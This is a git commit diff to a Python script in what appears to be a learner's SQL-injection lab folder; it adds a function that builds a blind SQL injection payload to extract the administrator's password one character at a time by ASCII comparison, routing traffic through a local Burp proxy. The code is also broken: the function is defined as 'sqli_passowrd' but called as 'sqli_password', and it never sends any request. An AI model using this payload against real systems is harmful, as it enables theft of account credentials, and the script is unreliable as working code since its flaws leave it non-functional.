81c047e14fd7654a85698d83b24263aea48a235a
Jozenartes <jozenarts12@gmail.com>
2025-06-16 14:24:30 +0100

    Added payload Function

--- 05-SQL-Injection/Blind-SQLI2.py
+++ 05-SQL-Injection/Blind-SQLI2.py
@@ -1,17 +1,30 @@
 import sys
 import requests
 import urllib3
+import urllib
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())
 
 #Sending the requests to burp, to able to debug, incase of an error.
 proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
+#Function that will show in real time the password entries, until it finds the matching password. 
+def sqli_passowrd(url):
+    password_extracted = ''
+    for i in range(1,21):
+        for j in range(32,126):
+            sqli_payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username = 'administrator')>'%s" %(i,j)
+            sqli_payload_encode = urllib.parse.quote(sqli_payload)
+
 def main():
     if len(sys.argv) != 2:
         print("[+] Usage: %s <url>" % sys.argv[0])
         #Correct way
-        Print("[+] Example: %s www.example.com" % sys.argv[0])
+        print("[+] Example: %s www.example.com" % sys.argv[0])
+
+    url = sys.argv[1]
+    print("[+] Retrieving administrator password")
+    sqli_password(url)
 
 if __name__ == "__main__":
     main()
